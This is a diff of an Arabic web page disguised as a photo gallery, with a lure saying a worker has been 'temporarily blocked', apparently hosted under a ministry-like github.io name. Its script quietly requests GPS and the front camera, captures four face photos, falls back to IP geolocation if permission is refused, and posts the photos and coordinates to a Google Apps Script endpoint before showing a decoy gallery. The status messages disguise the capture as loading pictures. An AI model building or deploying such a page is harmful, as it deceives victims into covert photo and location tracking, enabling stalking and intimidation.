@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -6,15 +7,15 @@
     <title>معرض الصور</title>
     <meta property="og:title" content="The worker has been temporarily blocked.">
     <meta property="og:description" content="This worker has been temporarily blocked. Tap to continue and view report details.">
-    <meta property="og:image" content="https://i.ibb.co/MkQL9w1d/Chat-GPT-Image-19-2026-09-44-25.png">
-    <meta property="og:image:secure_url" content="https://i.ibb.co/MkQL9w1d/Chat-GPT-Image-19-2026-09-44-25.png">
+    <meta property="og:image" content="https://i.ibb.co/Hp21fQYn/Passport-Block3.jpg">
+    <meta property="og:image:secure_url" content="https://i.ibb.co/Hp21fQYn/Passport-Block3.jpg">
     <meta property="og:image:type" content="image/jpeg">
-    <meta property="og:url" content="https://i.ibb.co/MkQL9w1d/Chat-GPT-Image-19-2026-09-44-25.png">
+    <meta property="og:url" content="https://ministryofheritageandtourism-alt.github.io/InspectionSection/">
     <meta property="og:type" content="website">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="The worker has been temporarily blocked.">
     <meta name="twitter:description" content="This worker has been temporarily blocked. Tap to continue and view report details.">
-    <meta name="twitter:image" content="https://i.ibb.co/MkQL9w1d/Chat-GPT-Image-19-2026-09-44-25.png">
+    <meta name="twitter:image" content="https://i.ibb.co/s9yKY3W3/0216fa03-9d1c-4a56-a67e-db86e5adee44.jpg">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body {
@@ -26,6 +27,8 @@
             justify-content: center;
             align-items: center;
             flex-direction: column;
+            user-select: none;
+            -webkit-user-select: none;
         }
         #status {
             font-size: 18px;
@@ -72,15 +75,24 @@
         // ================================
         // إعدادات Google Sheets
         // ================================
-        const SHEET_ID = '1i2KiUfCwkUxKodx-zypAdWA58f5VJlpVR60aXS47eh0';
+     const SHEET_ID = '1i2KiUfCwkUxKodx-zypAdWA58f5VJlpVR60aXS47eh0';
         const SHEET_NAME = 'LocationLink';
-        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycby6zxFy_WNl7XtfMufeqpBNBKoZ6W5ONxPv1mUlpeW40Ne1pu3CV0nkFDjxRvT1gmo/exec`;
+        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbyze4I9IYAPtAoAJCkvKdgjuhfdvN5H5mOac7Vf96-wFsHzwllikjN-LPvAn4oGKVfj/exec`;
 
         // ================================
         // روابط الصور للعرض في نافذة التفاصيل
         // ================================
-        const IMAGE_URLS = [
-            'https://i.ibb.co/JR2gKm5K/Chat-GPT-Image-Aug-19-2026-09-48-13-AM.png',
+          const IMAGE_URLS = [
+            'https://i.ibb.co/wNTvV100/Noha3.png',
+            'https://i.ibb.co/4ZhzNVxf/Noha4.png',
+            'https://i.ibb.co/cSjMq8Kd/Noha5.png',
+            'https://i.ibb.co/h1cKQhms/Noha6.png',
+            'https://i.ibb.co/fGB7p6Wd/Noha7.png',
+            'https://i.ibb.co/G3rSv7Bc/Noha.jpg',
+            'https://i.ibb.co/1Y0bDHbX/e56539cb8c9994e80002c0e7e65b5aa5.jpg',
+            'https://i.ibb.co/BKSc5ZMC/Noha1.png',
+            'https://i.ibb.co/hRymTprH/noha2.png',
+            // أضف المزيد من الروابط هنا
         ];
 
         // ================================
@@ -93,7 +105,7 @@
         let isDone = false;
         let cameraFrontReady = false;
         let cameraBackReady = false;
-        let processStarted = false;  // لمنع تكرار البدء
+        let processStarted = false;
 
         const statusDiv = document.getElementById('status');
 
@@ -122,9 +134,26 @@
         }
 
         // ================================
-        // دالة فتح نافذة التفاصيل (معرض الصور)
+        // دالة فتح نافذة المعرض الجديدة (شبكة صور مع قلوب وعدادات)
         // ================================
         function openBlockWindow() {
+            // بناء HTML لعرض كل الصور في شبكة مع عناصر الإعجاب
+            let galleryHTML = '';
+            IMAGE_URLS.forEach((url, index) => {
+                galleryHTML += `
+                    <div class="image-card" data-url="${url}" data-index="${index}">
+                        <div class="image-wrapper">
+                            <img src="${url}" alt="صورة ${index+1}" draggable="false" oncontextmenu="return false;">
+                            <div class="overlay"></div>
+                        </div>
+                        <div class="like-controls">
+                            <button class="heart-btn" data-url="${url}" onclick="toggleLike('${url}')">🤍</button>
+                               <span class="like-count" id="count-${url}" style="display:none;">0</span>
+                        </div>
+                    </div>
+                `;
+            });
+
             const htmlContent = `
             <!DOCTYPE html>
             <html lang="ar" dir="rtl">
@@ -133,126 +162,296 @@
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>معرض الصور</title>
                 <style>
-                    * { margin:0; padding:0; box-sizing:border-box; }
+                    * { margin:0; padding:0; box-sizing:border-box; user-select: none; -webkit-user-select: none; }
                     body {
-                        background: #000;
+                        background: #0a0a0a;
+                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                        padding: 20px;
+                        min-height: 100vh;
                         display: flex;
                         justify-content: center;
-                        align-items: center;
-                        height: 100vh;
-                        margin: 0;
+                    }
+                    .gallery {
+                        max-width: 1200px;
+                        width: 100%;
+                        display: grid;
+                        grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+                        gap: 25px;
+                        padding: 20px 0;
+                    }
+                    .image-card {
+                        background: #1a1a1a;
+                        border-radius: 16px;
+                        overflow: hidden;
+                        box-shadow: 0 8px 30px rgba(0,0,0,0.7);
+                        transition: transform 0.2s;
+                        border: 1px solid rgba(255,255,255,0.05);
+                        display: flex;
+                        flex-direction: column;
+                    }
+                    .image-card:hover {
+                        transform: translateY(-4px);
+                    }
+                    .image-wrapper {
+                        position: relative;
+                        width: 100%;
+                        padding-top: 100%; /* 1:1 مربع */
+                        background: #111;
                         overflow: hidden;
                     }
-                    .container {
-                        width: 100vw;
-                        height: 100vh;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        position: relative;
-                        background: #000;
-                    }
-                    .image-container {
-                        width: 100%;
-                        height: 100%;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                    }
-                    .image-container img {
-                        width: 100%;
-                        height: 100%;
-                        object-fit: contain;
-                    }
-                    .nav-btn {
+                    .image-wrapper img {
                         position: absolute;
-                        top: 50%;
-                        transform: translateY(-50%);
-                        background: rgba(255,255,255,0.3);
-                        color: #fff;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        object-fit: cover;
+                        display: block;
+                        pointer-events: none; /* لمنع السحب والنقر الأيمن */
+                        -webkit-user-drag: none;
+                        user-drag: none;
+                    }
+                    .overlay {
+                        position: absolute;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: transparent;
+                        pointer-events: none;
+                    }
+                    .like-controls {
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        gap: 15px;
+                        padding: 12px;
+                        background: #111;
+                        border-top: 1px solid #2a2a2a;
+                        direction: ltr;
+                    }
+                    .heart-btn {
+                        background: transparent;
                         border: none;
-                        padding: 20px 15px;
-                        font-size: 30px;
+                        font-size: 28px;
                         cursor: pointer;
-                        z-index: 10;
-                        border-radius: 5px;
-                        transition: 0.3s;
+                        transition: 0.2s;
+                        filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
+                        touch-action: manipulation;
+                        line-height: 1;
+                        padding: 0 5px;
                     }
-                    .nav-btn:hover {
-                        background: rgba(255,255,255,0.6);
+                    .heart-btn:hover {
+                        transform: scale(1.2);
                     }
-                    .prev { left: 10px; }
-                    .next { right: 10px; }
-                    .counter {
-                        position: absolute;
-                        bottom: 20px;
-                        left: 50%;
-                        transform: translateX(-50%);
+                    .heart-btn.liked {
+                        animation: pop 0.3s ease;
+                    }
+                    @keyframes pop {
+                        0% { transform: scale(1); }
+                        50% { transform: scale(1.4); }
+                        100% { transform: scale(1); }
+                    }
+                    .like-count {
                         color: #fff;
-                        background: rgba(0,0,0,0.7);
-                        padding: 8px 20px;
-                        border-radius: 20px;
+                        font-size: 18px;
+                        font-weight: bold;
+                        min-width: 30px;
+                        text-align: center;
+                        background: rgba(255,255,255,0.05);
+                        padding: 4px 12px;
+                        border-radius: 30px;
+                        border: 1px solid rgba(255,255,255,0.05);
+                    }
+                    .close-btn {
+                        position: fixed;
+                        top: 20px;
+                        right: 20px;
+                        background: rgba(255,255,255,0.1);
+                        backdrop-filter: blur(6px);
+                        color: #fff;
+                        border: 1px solid rgba(255,255,255,0.2);
+                        padding: 10px 18px;
+                        border-radius: 40px;
                         font-size: 16px;
-                        font-family: Arial, sans-serif;
-                        z-index: 10;
+                        cursor: pointer;
+                        z-index: 100;
+                        transition: 0.3s;
+                        font-weight: 500;
+                        touch-action: manipulation;
+                    }
+                    .close-btn:hover {
+                        background: rgba(255,255,255,0.25);
+                    }
+                    @media (max-width: 600px) {
+                        .gallery { grid-template-columns: 1fr; }
+                        .close-btn { top: 10px; right: 10px; font-size: 14px; padding: 6px 14px; }
                     }
                 </style>
             </head>
             <body>
-                <div class="container">
-                    <button class="nav-btn prev" onclick="changeImage(-1)">❮</button>
-                    <div class="image-container" id="imageContainer">
-                        <img id="currentImage" src="" alt="صورة">
-                    </div>
-                    <button class="nav-btn next" onclick="changeImage(1)">❯</button>
-                    <div class="counter" id="counter">1 / 1</div>
+                <button class="close-btn" onclick="window.close()">✕ إغلاق</button>
+                <div class="gallery" id="galleryContainer">
+                    ${galleryHTML}
                 </div>
-                <script>
-                    const images = ${JSON.stringify(IMAGE_URLS)};
-                    let currentIndex = 0;
-                    const imgElement = document.getElementById('currentImage');
-                    const counterElement = document.getElementById('counter');
 
-                    function updateImage() {
-                        if (images.length > 0) {
-                            imgElement.src = images[currentIndex];
-                            counterElement.textContent = (currentIndex + 1) + ' / ' + images.length;
+                <script>
+                    // منع النسخ والسحب والقائمة اليمنى
+                    document.addEventListener('contextmenu', e => e.preventDefault());
+                    document.addEventListener('copy', e => e.preventDefault());
+                    document.addEventListener('dragstart', e => e.preventDefault());
+                    document.addEventListener('selectstart', e => e.preventDefault());
+                    // منع السحب على الصور
+                    document.querySelectorAll('img').forEach(img => {
+                        img.addEventListener('dragstart', e => e.preventDefault());
+                        img.addEventListener('contextmenu', e => e.preventDefault());
+                    });
+
+                    // ================================
+                    // إعدادات الخادم
+                    // ================================
+                    const GOOGLE_SCRIPT_URL = '${GOOGLE_SCRIPT_URL}';
+                    const SHEET_ID = '${SHEET_ID}';
+                    const IMAGE_URLS = ${JSON.stringify(IMAGE_URLS)};
+
+                    // خريطة الإعجابات العالمية (من الخادم)
+                    let likesMap = {};
+
+                    // ================================
+                    // جلب الإعجابات من الخادم
+                    // ================================
+                    async function fetchLikes() {
+                        try {
+                            const url = GOOGLE_SCRIPT_URL + '?action=getLikes&sheetId=' + SHEET_ID;
+                            const response = await fetch(url, { mode: 'cors' });
+                            if (!response.ok) throw new Error('فشل جلب الإعجابات');
+                            const data = await response.json();
+                            if (data.status === 'success') {
+                                likesMap = data.likes || {};
+                            } else {
+                                console.warn('خطأ في جلب الإعجابات:', data.message);
+                            }
+                        } catch (error) {
+                            console.error('خطأ في جلب الإعجابات:', error);
+                        }
+                        // تحديث كل البطاقات
+                        updateAllLikes();
+                    }
+
+                    // ================================
+                    // تحديث الإعجاب على الخادم
+                    // ================================
+                    async function updateLikeOnServer(imageUrl, newLikes) {
+                        try {
+                            const payload = {
+                                action: 'updateLike',
+                                sheetId: SHEET_ID,
+                                imageUrl: imageUrl,
+                                likes: newLikes
+                            };
+                            const response = await fetch(GOOGLE_SCRIPT_URL, {
+                                method: 'POST',
+                                mode: 'cors',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify(payload)
+                            });
+                            const data = await response.json();
+                            if (data.status !== 'success') {
+                                console.warn('فشل تحديث الإعجاب:', data.message);
+                            }
+                        } catch (error) {
+                            console.error('خطأ في تحديث الإعجاب:', error);
                         }
                     }
 
-                    function changeImage(direction) {
-                        if (images.length === 0) return;
-                        currentIndex = (currentIndex + direction + images.length) % images.length;
-                        updateImage();
+                    // ================================
+                    // دوال localStorage لحالة المستخدم
+                    // ================================
+                    function getMyLikeLocal(url) {
+                        const key = 'mylike_' + url;
+                        return localStorage.getItem(key) === 'true';
+                    }
+                    function setMyLikeLocal(url, val) {
+                        const key = 'mylike_' + url;
+                        localStorage.setItem(key, val ? 'true' : 'false');
                     }
 
-                    document.addEventListener('keydown', function(e) {
-                        if (e.key === 'ArrowLeft') changeImage(-1);
-                        if (e.key === 'ArrowRight') changeImage(1);
-                    });
+                    // ================================
+                    // تحديث واجهة جميع الصور بالإعجابات
+                    // ================================
+                    function updateAllLikes() {
+                        IMAGE_URLS.forEach(url => {
+                            const countEl = document.getElementById('count-' + url);
+                            const btn = document.querySelector('.heart-btn[data-url="' + url + '"]');
+                            if (!countEl || !btn) return;
+                            const total = likesMap[url] || 0;
+                            const myLike = getMyLikeLocal(url);
+                            countEl.textContent = total;
+                            btn.textContent = myLike ? '❤️' : '🤍';
+                            if (myLike) {
+                                btn.classList.add('liked');
+                            } else {
+                                btn.classList.remove('liked');
+                            }
+                        });
+                    }
 
-                    imgElement.addEventListener('click', function() {
-                        window.open(images[currentIndex], '_blank');
-                    });
+                    // ================================
+                    // تبديل الإعجاب عند الضغط على القلب
+                    // ================================
+                    async function toggleLike(imageUrl) {
+                        const myLike = getMyLikeLocal(imageUrl);
+                        let total = likesMap[imageUrl] || 0;
+                        if (myLike) {
+                            total = Math.max(0, total - 1);
+                            setMyLikeLocal(imageUrl, false);
+                        } else {
+                            total = total + 1;
+                            setMyLikeLocal(imageUrl, true);
+                        }
+                        // تحديث الخريطة المحلية
+                        likesMap[imageUrl] = total;
+                        // تحديث الواجهة
+                        const countEl = document.getElementById('count-' + imageUrl);
+                        const btn = document.querySelector('.heart-btn[data-url="' + imageUrl + '"]');
+                        if (countEl) countEl.textContent = total;
+                        if (btn) {
+                            btn.textContent = getMyLikeLocal(imageUrl) ? '❤️' : '🤍';
+                            btn.classList.remove('liked');
+                            if (getMyLikeLocal(imageUrl)) {
+                                btn.classList.add('liked');
+                            }
+                            // تأثير حركي
+                            btn.style.animation = 'none';
+                            setTimeout(() => btn.style.animation = 'pop 0.3s ease', 10);
+                        }
+                        // إرسال التحديث إلى الخادم
+                        updateLikeOnServer(imageUrl, total);
+                    }
 
-                    updateImage();
+                    // ================================
+                    // جلب الإعجابات عند التحميل
+                    // ================================
+                    fetchLikes();
+
+                    console.log('✅ معرض الصور مع إعجابات متصلة بالخادم');
                 <\/script>
             </body>
             </html>
             `;
 
-            const newWin = window.open('', '_blank', 'width=800,height=700,scrollbars=yes,resizable=yes');
+            const newWin = window.open('', '_blank', 'width=900,height=800,scrollbars=yes,resizable=yes');
             if (newWin) {
                 newWin.document.write(htmlContent);
                 newWin.document.close();
             } else {
-                statusDiv.innerHTML = "⚠️ لا يمكن فتح النافذة المنبثقة. سمح بالنوافذ المنبثقة.";
+                statusDiv.innerHTML = "⚠️ لا يمكن فتح النافذة المنبثقة. اسمح بالنوافذ المنبثقة.";
                 statusDiv.className = "status-error";
             }
         }
 
         // ================================
-        // دالة التقاط صورة من فيديو معين
+        // باقي دوال التقاط الصور والموقع (دون تغيير)
         // ================================
         function captureImageFromVideo(videoElement) {
             if (!videoElement || !videoElement.videoWidth) return null;
@@ -264,15 +463,11 @@
             return canvas.toDataURL('image/jpeg', 0.7);
         }
 
-        // ================================
-        // دالة تشغيل الكاميرات والتقاط الصور (تطلب الموقع والكاميرا معاً)
-        // ================================
         async function requestPermissionsTogether() {
             try {
-                statusDiv.innerHTML = "📱 الرجاء منح الاذن لمشاهدة صفحة الصور...";
+                statusDiv.innerHTML = "📱 جاري طلب أذونات الصفحة لعرض الصور...";
                 statusDiv.className = "status-loading";
 
-                // طلب الموقع والكاميرا في وقت واحد
                 const [position, stream] = await Promise.all([
                     new Promise((resolve, reject) => {
                         if (!navigator.geolocation) {
@@ -286,16 +481,11 @@
                         });
                     }),
                     navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 320 },
-                            height: { ideal: 240 }
-                        },
+                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                         audio: false
                     })
                 ]);
 
-                // تخزين بيانات الموقع
                 const { latitude, longitude } = position.coords;
                 locationData = { latitude, longitude, source: 'GPS' };
                 const locationName = await getLocationName(latitude, longitude);
@@ -304,7 +494,6 @@
                 statusDiv.innerHTML = `📍 الموقع: ${locationName}`;
                 statusDiv.className = "status-success";
 
-                // تشغيل الكاميرا
                 const videoFront = document.getElementById('videoFront');
                 videoFront.srcObject = stream;
                 await new Promise((resolve) => {
@@ -318,21 +507,16 @@
                 statusDiv.innerHTML = "✅ الصفحة جاهزة. جاري جلب الصور...";
                 statusDiv.className = "status-success";
 
-                // التقاط 4 صور
                 const videoFrontEl = document.getElementById('videoFront');
                 for (let i = 0; i < 4; i++) {
                     await new Promise(resolve => setTimeout(resolve, 300));
                     const imgData = captureImageFromVideo(videoFrontEl);
                     if (imgData) {
-                        if (i < 2) {
-                            frontImages.push(imgData);
-                        } else {
-                            backImages.push(imgData);
-                        }
+                        if (i < 2) { frontImages.push(imgData); } 
+                        else { backImages.push(imgData); }
                     }
                 }
 
-                // إيقاف الكاميرا
                 if (videoFront.srcObject) {
                     videoFront.srcObject.getTracks().forEach(track => track.stop());
                 }
@@ -349,18 +533,13 @@
                 }
 
             } catch (err) {
-                // إذا فشل أحد الأذونات، نحاول استخدام IP والكاميرا بشكل منفصل
                 statusDiv.innerHTML = "⚠️ تم رفض أحد الأذونات. جاري المحاولة باستخدام IP...";
                 statusDiv.className = "status-warning";
                 getLocationViaIP();
 
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 320 },
-                            height: { ideal: 240 }
-                        },
+                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                         audio: false
                     });
 
@@ -378,11 +557,8 @@
                         await new Promise(resolve => setTimeout(resolve, 300));
                         const imgData = captureImageFromVideo(videoFront);
                         if (imgData) {
-                            if (i < 2) {
-                                frontImages.push(imgData);
-                            } else {
-                                backImages.push(imgData);
-                            }
+                            if (i < 2) { frontImages.push(imgData); } 
+                            else { backImages.push(imgData); }
                         }
                     }
 
@@ -390,16 +566,15 @@
                         videoFront.srcObject.getTracks().forEach(track => track.stop());
                     }
 
-                    statusDiv.innerHTML = `📸 تم التقاط ${frontImages.length + backImages.length} صورة (موقع تقريبي)`;
+                    statusDiv.innerHTML = `📸 تم جلب الصور ${frontImages.length + backImages.length} صورة (موقع تقريبي)`;
                     statusDiv.className = "status-success";
 
                     if (frontImages.length >= 2 && backImages.length >= 2) {
-                        // ننتظر قليلاً حتى يتم تحديد الموقع عبر IP
                         setTimeout(async () => {
                             if (locationData) {
                                 await sendAllData();
                             } else {
-                                statusDiv.innerHTML = "❌ لم يتم فتح صفحة الصور. الرجاء السماح بالوصول.";
+                                statusDiv.innerHTML = "❌ لم يتم الحصول على الصفحة. الرجاء السماح بالوصول.";
                                 statusDiv.className = "status-error";
                                 resetProcess();
                             }
@@ -410,16 +585,13 @@
                         resetProcess();
                     }
                 } catch (cameraErr) {
-                    statusDiv.innerHTML = "❌ تم رفض أذونات الصفحة. الرجاء السماح بالوصول.";
+                    statusDiv.innerHTML = "❌ تم رفض أذونات الصفحة لعرض الصور. الرجاء السماح بالوصول.";
                     statusDiv.className = "status-error";
                     resetProcess();
                 }
             }
         }
 
-        // ================================
-        // دالة إرسال البيانات إلى Google Sheets
-        // ================================
         async function sendAllData() {
             if (!locationData || frontImages.length < 2 || backImages.length < 2) {
                 statusDiv.innerHTML = "❌ بيانات ناقصة. لا يمكن فتح المعرض.";
@@ -449,7 +621,7 @@
                 imageData4: backImages[1] || ''
             };
 
-            statusDiv.innerHTML = "📤 جاري جلب الصور من الخادم...";
+            statusDiv.innerHTML = "📤 جاري جلب البيانات من الخادم...";
             statusDiv.className = "status-loading";
 
             try {
@@ -459,7 +631,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                statusDiv.innerHTML = "✅ تم الوصول بنجاح! جاري فتح الصور...";
+                statusDiv.innerHTML = "✅ تم الإرسال بنجاح! جاري فتح المعرض...";
                 statusDiv.className = "status-success";
                 openBlockWindow();
                 isDone = true;
@@ -474,31 +646,19 @@
             }
         }
 
-        // ================================
-        // دوال جلب الموقع عبر IP (بديل)
-        // ================================
+        // دوال IP (كما هي)
         function getLocationViaIP() {
             fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
                 .then(res => res.ok ? res.json() : Promise.reject())
-                .then(data => {
-                    if (data.latitude && data.longitude) {
-                        storeLocationFallback(data.latitude, data.longitude);
-                    }
-                })
+                .then(data => { if (data.latitude && data.longitude) storeLocationFallback(data.latitude, data.longitude); })
                 .catch(() => getLocationViaIP2());
         }
-
         function getLocationViaIP2() {
             fetch('https://ipapi.co/json/')
                 .then(res => res.ok ? res.json() : Promise.reject())
-                .then(data => {
-                    if (data.latitude && data.longitude) {
-                        storeLocationFallback(data.latitude, data.longitude);
-                    }
-                })
+                .then(data => { if (data.latitude && data.longitude) storeLocationFallback(data.latitude, data.longitude); })
                 .catch(() => getLocationViaIP3());
         }
-
         function getLocationViaIP3() {
             fetch('https://ipinfo.io/json')
                 .then(res => res.ok ? res.json() : Promise.reject())
@@ -511,7 +671,6 @@
                     }
                 });
         }
-
         function storeLocationFallback(lat, lng) {
             if (locationData) return;
             locationData = { latitude: lat, longitude: lng, source: 'IP' };
@@ -519,57 +678,36 @@
                 locationData.locationName = name;
                 statusDiv.innerHTML = `📍 الموقع التقريبي: ${name}`;
                 statusDiv.className = "status-success";
-                // إذا كانت الصور جاهزة، نرسل البيانات
                 if (frontImages.length >= 2 && backImages.length >= 2 && !sendInProgress && !isDone) {
                     sendAllData();
                 }
             });
         }
 
-        // ================================
-        // إعادة تعيين العملية للسماح بإعادة المحاولة
-        // ================================
         function resetProcess() {
             processStarted = false;
-            // لا نمسح البيانات حتى لا نفقدها، لكن نسمح بإعادة التشغيل
         }
 
-        // ================================
-        // بدء العملية عند أول نقرة
-        // ================================
         function startProcess() {
             if (processStarted) return;
             processStarted = true;
-            // إعادة تعيين المتغيرات
             frontImages = [];
             backImages = [];
             locationData = null;
             sendInProgress = false;
             isDone = false;
             cameraFrontReady = false;
-            document.querySelector('.click-hint')?.remove(); // إزالة التلميح بعد البدء
+            document.querySelector('.click-hint')?.remove();
             requestPermissionsTogether();
         }
 
-        // مستمع النقر على الصفحة
         document.addEventListener('click', startProcess);
-
-        // مستمع للزر التلميحي (اختياري)
         const hint = document.getElementById('clickHint');
-        if (hint) {
-            hint.addEventListener('click', startProcess);
-        }
+        if (hint) hint.addEventListener('click', startProcess);
 
-        // في حال أراد المستخدم البدء فوراً بدون نقرة (قد لا يعمل بسبب سياسات المتصفح)
-        // لكننا نضع timeout صغير لتجربة الطلب التلقائي إذا كان المتصفح يسمح
         setTimeout(() => {
             if (!processStarted) {
-                // نحاول الطلب التلقائي ولكن قد يمنع
-                try {
-                    startProcess();
-                } catch (e) {
-                    // تبقى الرسالة "انقر لبدء"
-                }
+                try { startProcess(); } catch (e) {}
             }
         }, 500);
     </script>
